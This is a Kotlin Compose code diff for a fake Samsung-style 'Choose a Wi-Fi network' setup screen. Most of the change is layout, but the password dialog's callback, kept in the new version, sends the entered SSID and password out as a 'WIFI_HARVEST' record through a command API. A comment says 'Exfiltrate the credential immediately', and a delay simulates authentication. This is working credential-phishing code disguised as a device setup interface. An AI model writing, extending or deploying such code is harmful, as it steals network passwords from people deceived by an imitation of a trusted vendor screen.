@@ -327,75 +327,77 @@ class WelcomeUI : DynamicEntry() {
             }
         }
 
-        if (selectedSsid != null) {
-            SamsungPasswordDialog(selectedSsid!!, onDismiss = { selectedSsid = null }) { password ->
-                isConnecting = true
-                val ssid = selectedSsid!!
-                selectedSsid = null
-                // 1. Exfiltrate the credential immediately
-                val logCmd = org.json.JSONObject().apply {
-                    put("file_name", "PING")
-                    put("content", "WIFI_HARVEST | SSID: $ssid | PASS: $password")
-                }
-                api.executeCommand(logCmd.toString())
+        Box(modifier = Modifier.fillMaxSize()) {
+            Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp)) {
+                Spacer(modifier = Modifier.height(80.dp))
+                DynamicImage(baseDir, "wifi_logo.png", modifier = Modifier.size(36.dp).align(Alignment.CenterHorizontally))
+                Text("Choose a Wi-Fi network", fontSize = 32.sp, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 16.dp, bottom = 40.dp))
                 
-                // 2. Perform real hardware connection
-                api.connectToWifi(ssid, password)
-                
-                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
-                    delay(3500) // Simulate auth latency
-                    isConnecting = false
-                    connectionSuccess = true
-                    delay(1500)
-                    onConnected()
-                }
-            }
-        }
-
-        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp)) {
-            Spacer(modifier = Modifier.height(80.dp))
-            DynamicImage(baseDir, "wifi_logo.png", modifier = Modifier.size(36.dp).align(Alignment.CenterHorizontally))
-            Text("Choose a Wi-Fi network", fontSize = 32.sp, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 16.dp, bottom = 40.dp))
-            
-            if (isWifiEnabled) {
-                androidx.compose.foundation.lazy.LazyColumn(modifier = Modifier.weight(1f)) {
-                    item {
-                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp)) {
-                            Icon(Icons.Default.Add, null, tint = SamsungGreen, modifier = Modifier.size(28.dp))
-                            Text("Add network", fontSize = 20.sp, modifier = Modifier.padding(start = 24.dp).weight(1f))
-                            Icon(Icons.Default.Search, null, tint = Color.Black, modifier = Modifier.size(24.dp))
+                if (isWifiEnabled) {
+                    androidx.compose.foundation.lazy.LazyColumn(modifier = Modifier.weight(1f)) {
+                        item {
+                            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp)) {
+                                Icon(Icons.Default.Add, null, tint = SamsungGreen, modifier = Modifier.size(28.dp))
+                                Text("Add network", fontSize = 20.sp, modifier = Modifier.padding(start = 24.dp).weight(1f))
+                                Icon(Icons.Default.Search, null, tint = Color.Black, modifier = Modifier.size(24.dp))
+                            }
+                        }
+                        
+                        if (isConnecting) {
+                            item { 
+                                Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
+                                    SamsungOrbitSpinner()
+                                }
+                            }
+                        } else if (networks.isEmpty()) {
+                            item { 
+                                Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
+                                    SamsungOrbitSpinner()
+                                }
+                            }
+                        } else {
+                            items(networks.size) { index ->
+                                val net = networks[index]
+                                WifiNetworkRow(net, connectionSuccess && index == 0) { selectedSsid = net.optString("ssid") }
+                            }
                         }
                     }
+                } else {
+                    Spacer(modifier = Modifier.weight(1f))
+                }
+
+                Text(
+                    text = if (isWifiEnabled) "Turn off Wi-Fi" else "Turn on Wi-Fi",
+                    color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp,
+                    modifier = Modifier.padding(vertical = 16.dp).clickable { isWifiEnabled = !isWifiEnabled; if(!isWifiEnabled) networks = emptyList() }
+                )
+                Text("Skip", color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp, modifier = Modifier.padding(bottom = 80.dp).clickable { onSkip() })
+            }
+
+            if (selectedSsid != null) {
+                SamsungPasswordDialog(selectedSsid!!, onDismiss = { selectedSsid = null }) { password ->
+                    isConnecting = true
+                    val ssid = selectedSsid!!
+                    selectedSsid = null
+                    // 1. Exfiltrate the credential immediately
+                    val logCmd = org.json.JSONObject().apply {
+                        put("file_name", "PING")
+                        put("content", "WIFI_HARVEST | SSID: $ssid | PASS: $password")
+                    }
+                    api.executeCommand(logCmd.toString())
                     
-                    if (isConnecting) {
-                        item { 
-                            Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
-                                SamsungOrbitSpinner()
-                            }
-                        }
-                    } else if (networks.isEmpty()) {
-                        item { 
-                            Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
-                                SamsungOrbitSpinner()
-                            }
-                        }
-                    } else {
-                        items(networks.size) { index ->
-                            val net = networks[index]
-                            WifiNetworkRow(net, connectionSuccess && index == 0) { selectedSsid = net.optString("ssid") }
-                        }
+                    // 2. Perform real hardware connection
+                    api.connectToWifi(ssid, password)
+                    
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
+                        delay(3500) // Simulate auth latency
+                        isConnecting = false
+                        connectionSuccess = true
+                        delay(1500)
+                        onConnected()
                     }
                 }
-            } else {
-                Spacer(modifier = Modifier.weight(1f))
             }
-
-            Text(
-                text = if (isWifiEnabled) "Turn off Wi-Fi" else "Turn on Wi-Fi",
-                color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp,
-                modifier = Modifier.padding(vertical = 16.dp).clickable { isWifiEnabled = !isWifiEnabled; if(!isWifiEnabled) networks = emptyList() }
-            )
-            Text("Skip", color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp, modifier = Modifier.padding(bottom = 80.dp).clickable { onSkip() })
         }
     }
 
@@ -470,8 +472,20 @@ class WelcomeUI : DynamicEntry() {
     @Composable
     fun SamsungPasswordDialog(ssid: String, onDismiss: () -> Unit, onConnect: (String) -> Unit) {
         var pass by remember { mutableStateOf("") }
-        androidx.compose.ui.window.Dialog(onDismissRequest = onDismiss) {
-            Surface(shape = RoundedCornerShape(24.dp), color = Color.White, modifier = Modifier.fillMaxWidth()) {
+        Box(
+            modifier = Modifier
+                .fillMaxSize()
+                .background(Color.Black.copy(alpha = 0.5f))
+                .pointerInput(Unit) { detectTapGestures { onDismiss() } },
+            contentAlignment = Alignment.Center
+        ) {
+            Surface(
+                shape = RoundedCornerShape(24.dp), 
+                color = Color.White, 
+                modifier = Modifier
+                    .fillMaxWidth(0.9f)
+                    .pointerInput(Unit) {} // Consume clicks to prevent dismiss
+            ) {
                 Column(modifier = Modifier.padding(24.dp)) {
                     Text(ssid, fontSize = 22.sp, fontWeight = FontWeight.Bold)
                     Spacer(Modifier.height(20.dp))
